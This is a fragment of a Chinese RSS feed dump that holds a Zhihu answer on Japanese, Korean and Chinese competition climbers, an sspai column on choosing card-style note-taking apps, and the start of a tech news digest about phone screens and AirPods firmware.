data-rawwidth=\"2048\" data-rawheight=\"1638\" data-watermark=\"watermark\" data-original-src=\"v2-2fd41eb66bb1344dc65fd8ba0e9239ac\" data-watermark-src=\"v2-df376e60a73fba5a0c4454a3f0765391\" data-private-watermark-src=\"v2-4123e466184d054709a8b39646d45a2b\"></p>\n<p>Jain Kim在国际攀联世界杯共获得过多达三十次分站赛冠军，并且积分在2009年至2018之内从来没有掉出过世界前三，在2019/2013/2014获得过先锋攀登年度总冠军，在2010年和2015年获得过年度综合总冠军。这些成绩或许在未来会被人超越，比如Adam Ondra或者Janja Garnbret（时尚上Janja已经拥有了更多年度综合总冠军，但是在分站赛冠军数量上远远够不上Jain的级别。），但至少在目前Jain的成绩还是独霸天下。</p>\n<p>除开成绩这些冰冷的数字本身，Jain更为大家所知的，是她的攀爬技巧。几乎所有的岩友在刚开始接触攀岩的时候，都或多或少被告知要看Jain Kim的视频学习。Jain Kim技术动作丰富，攀爬节奏行云流水，脚点放置和手点抓握精准，无论从哪个角度来看都是教科书一般的存在，非常适合新手的学习。</p>\n<p>Jain和Akiyo同岁，在世界赛场上互相较量多年。早年Jain一直压制着Akiyo，直到近年来Akiyo开发出动态，以及世界比赛抱石定线风格越来越偏向跑酷风以后，Jain的风头才渐渐褪去。即便如此，在先锋攀登的比赛中，Jain仍然是稳定的决赛圈选手，并且还是可以力压群雄拿下冠军。只是Jain本身的风格并不动态，在现在的抱石比赛中非常吃亏，有的时候连半决赛都只能勉强进入，所以一定程度拖累了综合成绩。</p>\n<p>Jain也有奥运梦想，在年度积分上没有优势的她，决定冲击一下2020年亚洲锦标赛，因为2020年亚洲锦标赛的冠军还是可以获得一个奥运名额。然而造化弄人，因为新冠疫情，2020年亚洲锦标赛不得不取消，由于时间紧急，世界攀联选择了顺沿积分最高的选手递补，Jain遗憾无缘奥运。可喜的是，Jain在奥运希望破灭之后选择了和自己结婚多年的老公要了一个孩子，今年刚刚出生，一家人共享天伦之乐。笔者还是真诚地希望以后能在国际赛场上见到Jain，但是如果Jain就此退役，对她的人生也未必不是一件好事。</p>\n<p>有趣的是，世界攀联顺沿递补的一男一女两个奥运名额，都落在了韩国选手的囊中——男选手是Jong-won Chon，女选手则是Chae-hyun Seo。</p>\n<p>Chae-hyun Seo今年才十七岁，刚出道时被誉为韩国天才少女，而且她从小是看着Jain的比赛长大的，并且拥有一个叫“小Jain Kim”的外号。两人是忘年之交，也经常一起训练，Jain甚至也在第一时间把自己怀孕的消息跟Chae-hyun分享。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5f884e7e75c1af6486c4bd8b66dfe225_720w.jpg?rss\" data-caption=\"Chae-hyun Seo在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"457\" data-watermark=\"watermark\" data-original-src=\"v2-5f884e7e75c1af6486c4bd8b66dfe225\" data-watermark-src=\"v2-be9623cc33efa79c1c2492a22d9ae051\" data-private-watermark-src=\"v2-d592125a0e64349ae65ea672445d1513\"></p>\n<p>Chae-hyun在十四岁的时候拿下了户外5.14d（科罗拉多州的Bad Girls Club）的好成绩，震惊了全世界。在2019年刚刚适龄参加世界攀联锦标赛，就在六次先锋攀登比赛中拿下4金1银1铜的好成绩，力压Janja成为年度的先锋攀登冠军。Chae-hyun和Jain Kim技术风格类似，在抱石比赛中也没有很大优势，想要真正称霸世界还有一段路要走。</p>\n<p>另一名值得一提的韩国选手是男队的Jong-won Chon，同样也获得了奥运名额。相比其他精英男选手，Jong-won Chon本身非常偏瘦，BMI值甚至只有17点几，是营养不良的标准。但是Jong-won Chon最大的优势在于指力强劲，并且在2015年和2017年都拿到过抱石的年度总冠军，近年来也都是抱石比赛决赛圈的常客。笔者深刻怀疑Jong-won属于怎么吃都吃不胖的体型，因为他声称自己最爱吃的就是汉堡，并且称汉堡为“强者的食物”。奥运赛场上，Jong-won的竞争对手有很多，除开两位日本选手以外，捷克之王Adam Ondra无疑也是最大威胁。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-501e5729fef8ba657458d6aa3589a35b_720w.jpg?rss\" data-caption=\"Jong-won Chong在比赛中。可以看出，他的身材非常精瘦。图源：Gettyimages\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"904\" data-watermark=\"watermark\" data-original-src=\"v2-501e5729fef8ba657458d6aa3589a35b\" data-watermark-src=\"v2-36e39e004bc245fad2ab3753fca0c917\" data-private-watermark-src=\"v2-390070b72bf892baa945234c2c7fe5fd\"></p>\n<p>相比韩国女队，韩国男队的后备力量要相对薄弱一些，在韩国全国比赛中，只要Jong-won不打盹，抱石冠军绝对没跑，先锋决赛也是毫无悬念。在培养后继巨星方面，韩国男队还需要努力。</p>\n<p><b>中国队</b></p>\n<p><b>关键词：希望</b></p>\n<p>相比日本和韩国两国，中国队目前的实力无疑是比较薄弱的。这个情况跟往前四五十年的中国围棋情况非常相似：中国向日韩努力学习，尤其日本。</p>\n<p>抱石目前是中国队在国际赛场上最需要提高的一项。和日本队以及韩国队选手经常是世界攀联锦标赛决赛的常客不同，中国队的队员往往需要在预选赛中超水平发挥才可以进入半决赛，然而在半决赛中往往也处于后半梯队，很难争取到一个决赛名额。</p>\n<p>先锋攀登方面，中国队要好一些。攀岩入奥以后，国家开始重视，开始有意培养攀岩选手，攀岩也在人民群众中开始普及，作为地大物博的国家自然有天才少年出现。中国选手在先锋攀登的世界攀联锦标赛中，已经能比较稳定地锁定半决赛名额，而且也能经常在决赛看到我们中国选手的身影。</p>\n<p>下面这个表格是2019年世界攀联锦标赛先锋攀登比赛各个分站赛的决赛成员，包含男女组。其中的两位中国选手我用红色标记出来了。这里日本队仍然是绿色，韩国队使用蓝青色，我们可以再次看到日本队可怕的统治力，以及2019年韩国天才少女Chae-hyun在先锋攀登中的优异表现：</p>\n<p>IFSC Lead Finalist in 2019 - Men &amp; Women </p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c9ff3c27111d54fcda4a678b8659eb0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1105\" data-rawheight=\"587\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在表格里面出现的这两位中国选手，就是我们国家自己的两位天才少年：潘愚非和张悦彤。其中，潘愚非成功拿到了奥运资格，张悦彤由于在预选赛后期遭遇伤病以及新冠疫情改制等原因无缘这次奥运。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4be21644e4af673c6b9d5976a9761aec_720w.jpg?rss\" data-caption=\"潘愚非在比赛中。\" data-size=\"normal\" data-rawwidth=\"1153\" data-rawheight=\"1729\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运选手：潘愚非</p>\n<p>笔者有一位在华南理工上大学的朋友。他在大学期间接触了攀岩，而且学校里就有攀岩馆，氛围非常好。而在攀岩馆内，爬得最好的并不是华南理工校队的成员，而是一位十岁的孩子——这位孩子，就是现在的潘愚非。</p>\n<p>潘愚非开始训练攀岩的理由，其实跟许多岩友有着相似之处。潘愚非从小体质弱，而且并不是很喜欢具有激烈身体对抗的体育活动，因此选择了攀岩。攀岩从来不是岩者跟岩者之间的较量，而永远是岩者跟岩壁之间的较量。潘愚非不断精进自己，改进自己的攀爬技术，补全自己的短板。</p>\n<p>在2017年的国际攀联锦标赛厦门站中，潘愚非就获得了男子先锋攀登的第三名，这是中国队第一次在先锋攀登站上领奖台。而在上图的2019年的国际攀联锦标赛Villars站中，潘愚非更是再一次取得了突破，获得了男子先锋攀登的第二名，并且锁定了一张奥运会入场券。这次奥运因为疫情延期，使得他更有机会能够继续锤炼自己，以求能在奥运赛场上取得更大的突破。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7f7444793dd9a63e0e8d20bc2f900390_720w.jpg?rss\" data-caption=\"张悦彤在比赛中。\" data-size=\"normal\" data-rawwidth=\"1267\" data-rawheight=\"950\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运遗珠：张悦彤</p>\n<p>如果说韩国拥有自己的天才少女Chae-hyun Seo的话，那么我们中国也有自己的天才少女，张悦彤（彤彤）。</p>\n<p>彤彤在深圳出生长大，从小就开始学习攀岩。在2012年开始参加全国青年攀岩锦标赛，就拿下该年龄段的先锋和速度冠军，并且完成四连霸。尽管在国内已经战绩显赫，但是彤彤在2018年才真正站到国际赛场，参加了国际攀联世界青年锦标赛，在16-17岁组获得了抱石比赛第五名，先锋攀登第三名的好成绩，可谓是出道就是高起点，相比Chae-hyu那也不遑多让。接着在2019年彤彤就开始参加了成年组的比赛取得了一次亚军，一次第六名，和一次第七名的好成绩。尽管目前在成绩上相比韩国天才选手Chae-hyun，以及日本小将Natsuki Tanii稍逊，但是未来的路还很长，彤彤的前景也很光明，我们完全有理由相信这三位选手在未来在亚洲和世界赛场上大放异彩，成为中日韩女子攀岩界的一时瑜亮。很有趣的是，这三位女孩子的私交也非常好，可以看到Instagram上她们经常的互相留言点赞。相信随着未来越来越多的世界攀联比赛以及奥运比赛，我们能更多地看到她们一起出现在国际赛场上。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3bb4a10e3c0bcfaa668edd335cf19e08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"597\" data-watermark=\"watermark\" data-original-src=\"v2-3bb4a10e3c0bcfaa668edd335cf19e08\" data-watermark-src=\"v2-3bd063b675312b8de5584fd4c8ff130b\" data-private-watermark-src=\"v2-7966abfc730a45b1d2b76f847d889f62\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-04a1bf0e8229b642e44aa87c76b4e74d_720w.jpg?rss\" data-caption=\"分别是Chae-hyun和彤彤在2019年国际攀联世界杯Briancon站之后的社交媒体截图。两位小姑娘私底下是很好的朋友，经常在社交媒体互动。\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"599\" data-watermark=\"watermark\" data-original-src=\"v2-04a1bf0e8229b642e44aa87c76b4e74d\" data-watermark-src=\"v2-65825b16f90050585a2daa6e71bdba23\" data-private-watermark-src=\"v2-6e9ccb69962552faf569044c35272581\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/liang-wei-93-75?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">梁维</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">132 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/265963316?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问滑板,滑雪跟冲浪这3种运动在学习或者滑行时有什么共同点跟不同点呢？</a><br><a href=\"http://www.zhihu.com/question/20535362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">冲浪运动有哪些需要注意的地方？</a><br>\n","link":"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"在找适合自己的卡片笔记应用？我的选择思路分享","date":"2021-08-05 03:32:14","description":"\n<h3><strong>专栏文章 首页推荐</strong></h3>\n<p>少数派专栏是 Matrix 社区中的一部分，我们会不定期挑选专栏中最优质的文章，展示来自用户和开发者的真实体验和观点。<a href=\"https://sspai.com/post/65959\" target=\"_blank\">点此</a> 了解什么是少数派专栏，<a href=\"https://sspai.com/columns\" target=\"_blank\">点击</a> 查看全部少数派专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/245\" target=\"_blank\">科研利器</a> 专栏，分享科研、教学日常中使用的工具与技术。关注专栏，随时掌握最新资讯。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>工欲善其事，必先利其器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/98c59a485982365cf880935ee686b9b2\" alt=\"\"></figure><p>之前为大家写过一篇《<a href=\"https://sspai.com/post/67923\">为什么你要用卡片笔记法？</a>》，很多人读完表示<strong>不过瘾</strong>。</p>\n<p>有人留言说，你介绍 1960 年代的笔记方法和工具给我，能有什么用？难道我今天记笔记、写文章，也需要拿什么京大卡、格子稿纸，甚至还要考虑笔迹会不会洇到卡片背面吗？我想知道的，是今天这么多笔记工具，我自己该选哪个。别那么虚，快整点儿实际的！</p>\n<p>别着急，路得一步一步走嘛。总不能吃下第三张饼饱了，就觉得前面两张没意义啊。本文咱们就来谈谈，在今天的情境下，卡片笔记工具的选择。</p>\n<p>首先得把概念说清楚。卡片笔记，不是说只有在屏幕上用卡片来显示的才算。只要能够<strong>践行卡片笔记方法的原则</strong>，能对我们知识工作起到应有帮助的数字化笔记工具，都可以算。想想看，你用纸、笔和抽屉能做的事情，哪一个数字化的笔记工具做不到呢？从这个角度来讲，你把 Word ，甚至是 Windows 自带的「写字板」叫做卡片笔记工具，其实也都不能算错。</p>\n<p>但这样一来，选项实在太多了。如果你在搜索引擎里面键入「笔记工具」，那马上就会体会到另一波「信息过载」。对比起来，反倒是 1960 年代的知识工作者比较幸福 —— 因为根本<strong>没得选</strong>，少了很多烦恼。你可能会问，选项多不好吗？我怎么觉得自助餐厅选项多很让我兴奋呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/c111bc32259d170f78297b88e079e0f0\" alt=\"\"><figcaption>自助餐厅选项多</figcaption></figure><p>问题是，几乎每一款笔记工具，都需要<strong>尝试的成本</strong>。这成本，首先体现在你需要花时间了解其功能。不少笔记工具，入门教程就可以写成系列书籍了，你光是阅读都需要花上好一阵子。而且有的工具，是需要先交钱才能用的。把市面上每一款付费笔记应用都买来尝试，对普通用户来说，也不现实。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/8f5a8036567f16dd5577335ae176e207\" alt=\"\"></figure><p>如果你发现某款工具很吸引你，你可能还得做个非常恼人的工作 —— <strong>迁移数据</strong>。把你的笔记从原先主力笔记应用里面弄出来，调整成合适的格式，再放到新的笔记工具中。</p>\n<p>更糟心的是：买了，也花时间尝试了，数据都迁移过后，用了一段时间，却发现不合适。一看日历，无条件退款时间刚好过期 2 天……</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/64431a8304773bb6aa3d748ea1d534ef\" alt=\"\"></figure><p>你估计会笑我笨 —— 哪有自己逐个尝试未知产品的？得用省力的办法啊！尽管我不可能亲自品尝每个城市的每家餐馆，但可以利用<strong>点评网站</strong>。用食客们的<strong>群体智慧</strong>，替我筛选不就好了？</p>\n<p>很遗憾地告诉你，这办法在笔记软件选择上<strong>不管用</strong>。为什么？因为笔记工具这个事儿上，用户的评价<strong>难以做到客观</strong>。你如果<strong>内心足够强大</strong>（注意这个前提条件哦），可以这样试试：找 A 笔记工具爱好者所在的群组或论坛，喊一声「我觉得 B 笔记工具更好！」……看看等待你的是啥。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/fd5c9abfd190290ab76cf5d944e08bb1\" alt=\"\"></figure><p>当工具不再是工具，而成了一种信仰的时候，工具的拥趸们，境遇就变得可悲了。他们自己境遇糟糕不要紧，还会影响很多其他无辜的新用户，跟着一起踩坑。</p>\n<p>找笔记工具，靠自己 —— 尝试，不现实；听别人的，又无所适从。这可怎么办呢？</p>\n<p>这就是为什么，我要给你介绍那些来自于半个世纪之前的智慧。《<a href=\"https://sspai.com/post/67923\">为什么你要用卡片笔记法？</a>》帮你梳理的，绝不是什么「老掉牙的过时论调」，而是一些你在数字时代，依然可以依凭的原则。帮你再简单回顾一下，人类对笔记工具的需求，来源于大脑本身功能的缺陷。至少体现在以下方面：</p>\n<ul>\n<li>容量不足</li>\n<li>资料风险</li>\n<li>欺软怕硬</li>\n</ul>\n<p>具体的解释，咱们就不赘述了。依照读者的反馈来看，大伙儿对 1969 年写出的书，依然有不少共鸣，甚至是非常强烈的感同身受。你可能会纳闷儿 —— 过去半个多世纪了，记笔记的这些问题为什么依然在呢？现在是什么年代？一台手机的计算能力，都轻松超过那时候的大型主机了。因为影响你知识管理问题的根源，并非技术的落后，而是受限于人类大脑这个「基础硬件」。这些年电脑日新月异，人脑却基本上没有什么显著的变化。</p>\n<p>这其实很容易理解。从演化的角度看，人脑是无论如何也无法在这么短的时间尺度，发生巨变的。否则，你得去看医生了。你真正认识到了<strong>头脑的局限，才是笔记工具应该解决的问题</strong>，笔记软件的选择，就变得简单许多了。正如黄峥所说的：</p>\n<blockquote><p>要花大量时间去研究什么是正确的事,然后再去想如何把事做正确。在正确的方向上逐步前进远比在不正确的方向上狂奔要好。</p></blockquote>\n<p>卡片笔记选择里，你第一步应该看的，是它可否帮助我们解决<strong>功能性需求</strong>。</p>\n<p>请你先暂时把「颜值」放在一边。我并不是说好用的笔记工具，长得都得难看。具体原因后面会讲。根据刚才提到的大脑三个凸显的问题，我们一一来衡量某款工具是否对给大脑「打补丁」有帮助。</p>\n<p>首先，我们知道自己的大脑「容量不足」。就需要能做到<strong>立即记录</strong>，从而抓住灵感火花，避免因为存储溢出，永远丢失。</p>\n<p>如果一个笔记软件，打开需要很长时间，每次都提示你「数据索引中」，甚至开屏还给你展示花花绿绿的广告，吸引你去点击……趁早扔了它。你需要的，是快速开启，而且打开就能立即记录。最好是可以跨平台记录。你得能拿着手机的时候记，举着 iPad 的时候记，开着电脑的时候记……都没带？抬起手表也能记。</p>\n<p>卡片笔记法是要通过数量来保证知识网络的关联性的。所以尽管记录可能发生在不同设备上，但是数据应该能够归并到一处。自己写卡片功不唐捐，才会更有劲头儿记。若是像从前记录的纸质卡片一样，七零八碎容易遗落，甚至掩埋在档案堆的深处，你会从内心抵触记笔记这个事儿的。</p>\n<p>其次，我们会顾忌到大脑记忆的「资料风险」，所以才用外部记录的方式，把头脑中的资料<strong>固化</strong>下来。那么笔记工具就至少得满足以下特性：</p>\n<ul>\n<li>\n<strong>数据无风险。</strong>如果三天两头崩溃、甚至丢失笔记记录，开发者出来道歉是不管用的。笔记工具的数据管理，必须要有充足的备份冗余，而且最好具有完备的版本管理与同步功能。</li>\n<li>\n<strong>检索得方便。</strong>笔记工具得提供足够多的元数据自动与手动添加功能。可以根据时间、标签、关键词等各种不同信息综合检索查询，并且能够进行结果的过滤。</li>\n<li>\n<strong>数据归自己。</strong>如果某款笔记工具希望把用户的原始数据牢牢把控在自己手里，那么你的笔记就是「人质」，它将来甚至可以用「撕票」来威胁你续费就范。你得注意笔记工具的导出形式。如果支持完整开放格式导出，例如 Markdown, TextBundle, JSON 等，那么这款工具更加靠谱。如果导出的是私有的纯文本格式（例如某种 XML 的方言），还可以勉强接受。若是只能导出为 PDF 格式……那就算了吧。</li>\n</ul>\n<p>再次，针对人脑「欺软怕硬」的特质，笔记工具应该可以帮助我们有效降低任务复杂度，降低焦虑感，提升知识管理的干劲儿。例如说，工作状态可以随时聚焦到「一张卡片」最小单元上，让我们无压力进行记录和整理、加工。</p>\n<p>当我们需要宏观概览的时候，可以通过双向链接的关联，把相关知识单元组成的网络一览无遗。为了能够自底向上不断拓展和延伸我们的知识结构，它得有足够方便的形式，让我们把卡片以不同的维度拼装关联起来。我们希望跨越主题藩篱时，它可以开放整张知识网络，让我们在上面凌波微步一般轻巧游走，还能<strong>随时找到回退的路径</strong>。</p>\n<p>有了上述这些原则，你未必能找到「最好的笔记工具」。因为所谓「<strong>最好的</strong>」笔记工具，原本就不存在。西谚有云：</p>\n<blockquote><p>One man’s meat, is another man’s poison.</p></blockquote>\n<p>人们口味各异，需求不一，强行评比出第一名没有意义，未必会适合你自己独特的知识工作方法与流程。这些原则，可以帮你有效过滤掉很多的选项，让你把目光集中在仅剩的一些候选选手身上。节省你大量的时间和精力，减少焦虑。</p>\n<p>但是这还没有完。咱们刚刚还仅是以《<a href=\"https://sspai.com/post/67923\">为什么你要用卡片笔记法？</a>》一文作为原则基础，给笔记工具的选择划定了一条底线。即便超越了底线，坑还有不少。我结合多年尝试和选择笔记工具踩坑的教训，再给你提几个醒。</p>\n<p>第一，警惕<strong>过分注重</strong>颜值的工具。</p>\n<p>如果你还记得我写过的那篇《<a href=\"https://sspai.com/post/57140\">笔记应用怎么选？</a>》，一定会反问：</p>\n<blockquote><p>老师，你这不是前后不一吗？当时你自己选笔记工具就是「颜控」啊。</p></blockquote>\n<p>笔记工具界面好看，让你赏心悦目，这绝不是坏事儿。有些黑暗主题，甚至还有（让用户认为）护眼的功能。但是，我们知道事情有轻重缓急之分。一个人，完成了本职工作后，业余的时间玩玩儿游戏放松一下，是好事儿。可一个人明明不是电子竞技选手，却要每天花 10 几个小时玩儿游戏，把正事儿全都搁置了，就不能说是健康发展了。</p>\n<p>现在市面上，还没有任何一款笔记工具，已将功能性需求做足。这个时候，如果开发团队放着清单上一堆需要改进的重要功能（例如移动客户端开发、编辑器字号缩放、富文本跨应用粘贴支持等）不理不睬，没完没了去「优化」外观设计，三天两头弄几个新图标出来，试图取悦用户……那基本上，就是<strong>创新乏力，技术门槛跨越不过去的标志</strong>。</p>\n<p>第二，分清「玩具」和「武器」的差别。</p>\n<p>我时常看到一些非常酷炫的新应用，把特色效果做得让人啧啧赞叹。例如卡片拟物、聚簇可视，简直就是把 Ted Nelson 的 Xanadu 项目实现了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/7d076aa073742f46973295d5ad745c7d\" alt=\"\"></figure><p>这样的工具，玩儿玩儿就行了。拿些不要紧的小项目尝试尝试也可以。可千万别太当真。因为它们（至少在目前阶段）只是「玩具」。你有三五十张卡片，用起来可能会觉得得心应手，惊呼爽快。但是，如果你有三五千张卡片，你会立即体会到以下这些巨大差异：</p>\n<ul>\n<li>首先是效率。原本顺滑的功能，立即可能卡得不要不要的。别忘了，百米冲刺，人可能比汽车要快。但跑个 50 公里试试？</li>\n<li>其次是功能。假设你要把卡片放在一个窗口里面显示，那卡片张数少的时候，你能够看到的聚簇是有用的；卡片张数一多，你看到的聚簇，就只是一团乱麻了。你可以参考我那篇《<a href=\"https://sspai.com/post/61864\">如何交互可视化 Roam Research 局部笔记网络？</a>》，对比一下不同规模笔记网络显示的区别。</li>\n</ul>\n<p>第三，不要被「拟态」迷惑。</p>\n<p>很多笔记应用的开发者，看到别的新工具有了个让大家喜爱的功能（例如双向链接），自己也赶忙去开发一个，试图避免用户流失。这里的逻辑，我早就揶揄过：</p>\n<blockquote><p>别人家的狗有 4 条腿，我家的猫也有 4 条腿，所以我家的猫是条狗。</p></blockquote>\n<p>猫就是猫，狗就是狗。基因这东西决定最根本的特性，仅靠「抄作业」做表面文章是不管用的。</p>\n<p>经常有人在我文后留言，说「某某（传统）工具」现在也有 XX 功能了，老师你不妨试试。我每次，都是非常礼貌地感谢读者的分享。但是我会去尝试吗？不。</p>\n<p>那款工具，我用过很久，对它的调性一清二楚。而软件的调性，如同生物的基因一样，很难改变。倒不是开发者不晓得，或者不想改。而是只要你敢改，你那堆拥趸，就会立即「粉转黑」，后面的画面让人目不忍视。这让他们根本就不敢想，也不敢尝试伤筋动骨的笔记应用底层重构。</p>\n<p>想想当年微软为了保持 Windows 操作系统「向后兼容」的承诺，给自己背上了一个多么沉重的历史包袱，错过了多么宝贵的发展机遇？因为这些限制条件，有些传统笔记工具团队会干脆做一个新的工具出来。老工具撑门面，新工具抢市场。如果你看到这样的组合，那么他们更可能是认真的。</p>\n<p>第四，没有必要对一款笔记应用求全责备。</p>\n<p>没有哪款笔记工具，可以在所有的维度上都做到最好 —— 那样别人也就没有饭碗了，你也不会看到这个赛道上有这么多的创新尝试。不要跟某个笔记工具过不去，天天去催人家把你需求的功能开发出来。因为对你来说非常重大的需求，在人家那里，可能只对 1% 的用户是痛点。在开发优先级列表上，不可能靠前。干等不是办法，骂也没有什么用。最好的办法，是把不同工具的长处结合起来，要善于使用「组合拳」。</p>\n<p>我在知识星球上面分享过一篇《<a href=\"https://t.zsxq.com/B2v7ayV\">重器轻用</a>》，就是讲这种系统化组合打法。这里只引用其中结尾的一段话，看看我目前的状态改变：</p>\n<blockquote><p>我省下来了大把的折腾功能时间，把它们都用在了读书和写笔记上面。我依然在关注着各种工具的进展，但是只把目光盯在那些好用的功能，是否可以改进我的工作流上面。于是我不再为了软件更新不及时而焦虑，反而几乎每天都有欣喜发生，还可以给我的图文和短视频分享提供主题（例如前几天分享的 ResearchRabbit ，参考视频号「王树义」）。</p></blockquote>\n<p>这篇文章里，还详细描述了我自己目前选用的笔记软件清单和组合工作流程。感兴趣的话，你也不妨看看。</p>\n<h2><strong>小结</strong></h2>\n<p>我们结合《<a href=\"https://sspai.com/post/67923\">为什么你要用卡片笔记法？</a>》一文中提到大脑应对信息洪流的三个显著问题，总结出了笔记应用选择的几个关键门槛指标：是不是能帮你快速记录？笔记保管是否稳妥，将来能不能找得到？能否降低记笔记时候的复杂度，减轻焦虑？</p>\n<p>为了进一步帮你避免踩坑，我还提到了另外 4 个笔记应用选择中常见错误：</p>\n<ul>\n<li>过分注重工具「颜值」；</li>\n<li>忽视可扩展性，把「玩具」当「武器」；</li>\n<li>被工具「拟态」迷惑，误以为功能等价；</li>\n<li>对某款工具迷恋，继而求全责备</li>\n</ul>\n<p>希望上述内容，对于你选择一款合适的笔记应用，能有帮助。如果你有自己挑选笔记工具的心得，也欢迎在留言区分享。我们共同讨论。</p>\n<p>祝进步！</p>\n<p>如果你觉得本文有用，请点赞。</p>\n<p>如果本文可能对你的朋友有帮助，请转发给他们。</p>\n<p>欢迎关注我的 <a href=\"https://sspai.com/column/245\">专栏</a>，以便及时收到后续的更新内容。</p>\n<h2><strong>延伸阅读</strong></h2>\n<p>你可能也会对以下话题感兴趣，点击链接就可以查看。</p>\n<ul>\n<li><a href=\"https://sspai.com/post/59314\">如何高效实践卡片式写作？</a></li>\n<li><a href=\"https://sspai.com/post/59314\">如何用卡片法写论文？</a></li>\n<li><a href=\"https://sspai.com/post/57476\">如何高效写长文？</a></li>\n<li><a href=\"https://sspai.com/post/64219\">如何拯救你的写作拖延症？</a></li>\n<li><a href=\"https://sspai.com/post/59951\">如何交互可视化你的卡片式笔记网络？</a></li>\n</ul>\n<p>题图： Photo by <a href=\"https://unsplash.com/@convertkit?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText\">ConvertKit</a> on <a href=\"https://unsplash.com/s/photos/note-taking?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText\">Unsplash</a></p>\n<span class=\"ss-paidSection\" product-id=\"75\" type=\"paidSection\"> </span><p> </p>\n","link":"https://sspai.com/post/68069"},{"title":"派早报：OPPO 公布新一代屏下摄像头技术、iQOO 将全球首发 E5 屏幕手机等","date":"2021-08-05 00:23:22","description":"\n<h2><strong>你可能错过的新鲜事</strong></h2>\n<h3>OPPO 公布新一代屏下摄像头技术</h3>\n<p>8 月 4 日，OPPO 公司公布了新一代屏下摄像头技术。新的屏下摄像头技术可以实现完整的全屏显示，并融合了独立驱动和 OPPO 自研算法。OPPO 还同步公开了搭载了新一代屏下摄像头的 <a href=\"https://weibo.com/1710173801/KrRFQwYDL?from=page_1006061710173801_profile&amp;wvr=6&amp;mod=weibotime&amp;type=comment\" target=\"_blank\">展示样机及宣传片</a>。<a href=\"https://weibo.com/1710173801/KrTpkeTub?refer_flag=1001030103_&amp;type=comment#_rnd1628084437620\" target=\"_blank\">来源</a></p>\n<figure class=\"ss-imgRows\" figcaption=\"OPPO 屏下摄像头效果展示，图片截取自技术宣传片\"><img src=\"https://cdn.sspai.com/2021/08/05/65de279fa2e91e9e42be485bd5a2cae5.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/f31be0ed15189beeb4ea4cd0f96eb2f0.png\" alt=\"\"></figure><h3>iQOO 确认全球首发搭载 E5 屏幕技术的手机</h3>\n<p>8 月 4 日，手机品牌 iQOO 确认将会全球首发搭载 E5 屏幕技术的手机。iQOO 已于 8 月 3 日宣布将于 8 月 17 日召开 iQOO 8 系列新品发布会，E5 屏幕技术也将应用于 iQOO 8 系列中。除了 E5 发光材料外，iQOO 8 系列的屏幕还将具备原生 10 亿色、2K 高清分辨率等特性。<a href=\"https://weibo.com/6960161079/KrTd82Vbt?from=page_1006066960161079_profile&amp;wvr=6&amp;mod=weibotime&amp;type=comment#_rnd1628084813983\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/05/article/68629b4495bc4bcfbd715f9205a6d94e\"><figcaption>iQOO 8 屏幕技术宣传图，图片来自新闻源</figcaption></figure><h3>AirPods Pro beta 版固件增加通话增强功能</h3>\n<p>在最新一版 AirPods Pro beta 版固件中，Apple 新增了通话增强功能（Conversation Boost）。该功能是 iOS 15 的系统特性之一，可以智能提升通话音量，并帮助轻、中度听障人士获得更好的沟通体验。<a href=\"https://www.macrumors.com/2021/08/04/airpods-pro-beta-firmware-2-conversation-boost/\" 